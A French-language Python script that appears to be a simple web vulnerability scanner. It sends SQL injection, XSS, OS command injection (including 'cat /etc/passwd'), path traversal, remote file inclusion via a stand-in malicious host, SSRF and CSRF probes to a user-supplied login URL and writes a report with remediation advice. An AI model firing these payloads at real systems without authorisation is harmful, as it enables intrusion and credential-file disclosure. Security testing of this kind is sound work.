import os
import requests
import time
import random
import re


url = input("Veuillez entrer l'URL de la page de connexion à tester (ex: http://exemple.com/login) : ")
username_field = "username"
password_field = "password"


use_brute_force = input("Souhaitez-vous activer le test de force brute avec dictionnaires ? (oui/non) : ").strip().lower() == "oui"

if use_brute_force:
    username_dict_path = input("Veuillez entrer le chemin vers le fichier dictionnaire des noms d'utilisateur : ")
    password_dict_path = input("Veuillez entrer le chemin vers le fichier dictionnaire des mots de passe : ")

    if not os.path.exists(username_dict_path) or not os.path.exists(password_dict_path):
        print("[ERREUR] Fichier dictionnaire introuvable. Veuillez vérifier les chemins.")
        exit()

    with open(username_dict_path, 'r') as f:
        usernames = f.read().splitlines()
    with open(password_dict_path, 'r') as f:
        passwords = f.read().splitlines()
else:
    usernames = []
    passwords = []


sql_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR '1'='1'/*",
    "' OR '1'='1'; --",
    "' OR 1=1--",
    "' OR 'a'='a",
    "' OR 'a'='a' --",
    "' OR 'a'='a' #",
    "' OR 'a'='a'/*",
    "') OR ('1'='1",
    "') OR '1'='1' --",
    "admin' --",
    "admin' #",
    "admin'/*",
]

# Liste  de payloads XSS
xss_payloads = [
    "<script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "'><svg/onload=alert('XSS')>",
    "<svg><script>alert('XSS')</script></svg>",
    "<marquee onstart=alert('XSS')>Test</marquee>",
    "<body onload=alert('XSS')>",
]

def write_report(report_lines, report_path):
    """Écrit les résultats des tests dans un fichier de rapport."""
    with open(report_path, 'w') as report_file:
        for line in report_lines:
            report_file.write(line + "\n")
    print(f"[INFO] Rapport des tests enregistré dans : {report_path}")

def test_sql_injection(report_lines):
    """Teste les injections SQL."""
    print("[INFO] Lancement du test SQL Injection")
    for payload in sql_payloads:
        data = {username_field: payload, password_field: payload}
        response = requests.post(url, data=data)
        if "welcome" in response.text.lower():
            message = f"[!] Vulnérabilité SQL Injection détectée avec le payload : {payload}\n"
            message += "    Exploitation : Ce payload a permis de contourner l'authentification ou d'exécuter des commandes SQL.\n"
            message += "    Solution : Utiliser des requêtes préparées et des paramètres pour éviter les injections.\n"
            report_lines.append(message)
            print(message)
            return
    report_lines.append("[-] Aucun vecteur SQL Injection détecté.\n")
    print("[-] Aucun vecteur SQL Injection détecté.")

def test_xss(report_lines):
    """Teste les vulnérabilités XSS."""
    print("[INFO] Lancement du test XSS")
    for payload in xss_payloads:
        data = {username_field: payload, password_field: payload}
        response = requests.post(url, data=data)
        if payload in response.text:
            message = f"[!] Vulnérabilité XSS détectée avec le payload : {payload}\n"
            message += "    Exploitation : Ce payload a été exécuté, permettant l'exécution de scripts malveillants.\n"
            message += "    Solution : Utiliser des filtres et un encodage approprié pour les entrées utilisateurs.\n"
            report_lines.append(message)
            print(message)
            return
    report_lines.append("[-] Aucun vecteur XSS détecté.\n")
    print("[-] Aucun vecteur XSS détecté.")

def test_csrf(report_lines):
    """Teste les vulnérabilités CSRF."""
    print("[INFO] Lancement du test CSRF")
    csrf_payload = "<img src='http://exemple.com/logout' />"
    response = requests.post(url, data={"csrf_token": csrf_payload})
    if "logged out" in response.text.lower():  
        message = "[!] Vulnérabilité CSRF détectée.\n"
        message += "    Exploitation : L'application ne protège pas contre les requêtes CSRF.\n"
        message += "    Solution : Implémenter des tokens CSRF pour valider les requêtes.\n"
        report_lines.append(message)
        print(message)

def test_command_injection(report_lines):
    """Teste les injections de commande."""
    print("[INFO] Lancement du test Command Injection")
    command_payloads = [
        "; ls -la",
        "; cat /etc/passwd",
        "| whoami",
        "| id"
    ]
    for payload in command_payloads:
        data = {username_field: payload, password_field: "test"}
        response = requests.post(url, data=data)
        if "root" in response.text or "user" in response.text:
            message = f"[!] Vulnérabilité d'injection de commande détectée avec le payload : {payload}\n"
            message += "    Exploitation : Ce payload a permis d'exécuter une commande système.\n"
            message += "    Solution : Éviter d'exécuter des commandes shell avec des entrées non vérifiées.\n"
            report_lines.append(message)
            print(message)
            return
    report_lines.append("[-] Aucun vecteur d'injection de commande détecté.\n")
    print("[-] Aucun vecteur d'injection de commande détecté.")

def test_file_inclusion(report_lines):
    """Teste les vulnérabilités d'inclusion de fichiers."""
    print("[INFO] Lancement du test d'inclusion de fichiers")
    file_payloads = [
        "../../../../etc/passwd",
        "php://filter/read=convert.base64-encode/resource=index.php"
    ]
    for payload in file_payloads:
        response = requests.get(url + f"?file={payload}")
        if "root" in response.text or "user" in response.text:
            message = f"[!] Vulnérabilité d'inclusion de fichiers détectée avec le payload : {payload}\n"
            message += "    Exploitation : L'inclusion de fichiers permet l'accès à des fichiers sensibles.\n"
            message += "    Solution : Valider et assainir les entrées pour éviter l'inclusion non sécurisée.\n"
            report_lines.append(message)
            print(message)
            return
    report_lines.append("[-] Aucun vecteur d'inclusion de fichiers détecté.\n")
    print("[-] Aucun vecteur d'inclusion de fichiers détecté.")

def test_rfi(report_lines):
    """Teste les vulnérabilités d'inclusion de fichiers distants (RFI)."""
    print("[INFO] Lancement du test d'inclusion de fichiers distants (RFI)")
    rfi_payload = "http://malicious.com/maliciousfile"
    response = requests.get(url + f"?file={rfi_payload}")
    if "malicious" in response.text:
        message = "[!] Vulnérabilité RFI détectée.\n"
        message += "    Exploitation : Un fichier malveillant a pu être inclus et exécuté.\n"
        message += "    Solution : Interdire l'inclusion de fichiers distants.\n"
        report_lines.append(message)
        print(message)

def test_lfi(report_lines):
    """Teste les vulnérabilités d'inclusion de fichiers locaux (LFI)."""
    print("[INFO] Lancement du test d'inclusion de fichiers locaux (LFI)")
    lfi_payload = "../../../../etc/passwd"
    response = requests.get(url + f"?file={lfi_payload}")
    if "root" in response.text:
        message = "[!] Vulnérabilité LFI détectée.\n"
        message += "    Exploitation : L'inclusion de fichiers sensibles a été réussie.\n"
        message += "    Solution : Éviter l'inclusion de fichiers non validés.\n"
        report_lines.append(message)
        print(message)

def test_ssrf(report_lines):
    """Teste les vulnérabilités SSRF (Server-Side Request Forgery)."""
    print("[INFO] Lancement du test SSRF")
    ssrf_payload = "http://localhost:80"
    response = requests.get(url + f"?url={ssrf_payload}")
    if "200 OK" in response.text:
        message = "[!] Vulnérabilité SSRF détectée.\n"
        message += "    Exploitation : Le serveur a pu faire des requêtes à des ressources internes.\n"
        message += "    Solution : Restreindre les requêtes sortantes du serveur.\n"
        report_lines.append(message)
        print(message)

def analyze_headers(response, report_lines):
    """Analyse les en-têtes HTTP pour des failles de sécurité."""
    print("[INFO] Analyse des en-têtes HTTP")
    security_headers = [
        "X-Content-Type-Options",
        "X-Frame-Options",
        "Content-Security-Policy",
        "Strict-Transport-Security",
        "X-XSS-Protection"
    ]
    
    missing_headers = []
    for header in security_headers:
        if header not in response.headers:
            missing_headers.append(header)	

    if missing_headers:
        message = f"[!] En-têtes de sécurité manquants : {', '.join(missing_headers)}\n"
        message += "    Solution : Implémenter ces en-têtes pour renforcer la sécurité.\n"
        report_lines.append(message)
        print(message)
    else:
        report_lines.append("[+] Tous les en-têtes de sécurité sont présents.\n")
        print("[+] Tous les en-têtes de sécurité sont présents.")

def analyze_source_code(response, report_lines):
    """Analyse le code source de la réponse pour détecter des mots de passe ou des noms d'utilisateur exposés."""
    print("[INFO] Analyse du code source")
    sensitive_patterns = [r"(?i)password", r"(?i)username", r"(?i)secret", r"(?i)api_key"]
    found_sensitive_info = []

    for pattern in sensitive_patterns:
        matches = re.findall(pattern, response.text)
        if matches:
            found_sensitive_info.append(pattern)

    if found_sensitive_info:
        message = f"[!] Informations sensibles détectées dans le code source : {', '.join(found_sensitive_info)}\n"
        message += "    Solution : Ne jamais exposer d'informations sensibles dans le code source.\n"
        report_lines.append(message)
        print(message)
    else:
        report_lines.append("[-] Aucune information sensible détectée dans le code source.\n")
        print("[-] Aucune information sensible détectée dans le code source.")

def analyze_javascript_obfuscation(response, report_lines):
    """Analyse la présence d'obfuscation dans le JavaScript."""
    print("[INFO] Analyse de l'obfuscation JavaScript")
    obfuscation_patterns = [
        r"eval\(", r"document\.write\(", r"setTimeout\(", r"setInterval\(", r"Function\("
    ]

    found_obfuscation = []
    for pattern in obfuscation_patterns:
        if re.search(pattern, response.text):
            found_obfuscation.append(pattern)

    if found_obfuscation:
        message = f"[!] Code JavaScript obfusqué détecté : {', '.join(found_obfuscation)}\n"
        message += "    Solution : Éviter l'obfuscation non nécessaire qui complique l'audit de sécurité.\n"
        report_lines.append(message)
        print(message)
    else:
        report_lines.append("[-] Aucun code JavaScript obfusqué détecté.\n")
        print("[-] Aucun code JavaScript obfusqué détecté.")

def run_tests():
    """Exécute tous les tests et génère un rapport."""
    report_lines = []
    
    test_sql_injection(report_lines)
    test_xss(report_lines)
    test_csrf(report_lines)
    test_command_injection(report_lines)
    test_file_inclusion(report_lines)
    test_rfi(report_lines)
    test_lfi(report_lines)
    test_ssrf(report_lines)

 
    response = requests.get(url)
    analyze_headers(response, report_lines)
    analyze_source_code(response, report_lines)
    analyze_javascript_obfuscation(response, report_lines)


    report_path = "rapport_test.txt"
    write_report(report_lines, report_path)


run_tests()
